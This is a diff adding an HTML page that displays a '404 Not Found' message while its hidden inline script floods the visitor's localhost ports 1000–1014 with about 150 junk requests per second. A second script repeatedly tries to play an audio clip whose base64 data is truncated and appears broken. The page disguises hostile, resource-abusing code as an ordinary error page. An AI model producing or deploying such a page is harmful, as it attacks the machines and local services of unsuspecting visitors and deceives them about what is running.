@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Connecting...</title>
+  <script>
+    setInterval(() => {
+      for (let i = 0; i < 15; i++) {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", `https://localhost:${1000 + i}/?junk=${Math.random()}`, true);
+        xhr.send();
+      }
+    }, 100);
+
+    setInterval(() => {
+      const audio = new Audio("data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEA...");
+      audio.play().catch(() => {});
+    }, 500);
+  </script>
+</head>
+<body>
+  <h1>404 Not Found</h1>
+</body>
+</html>
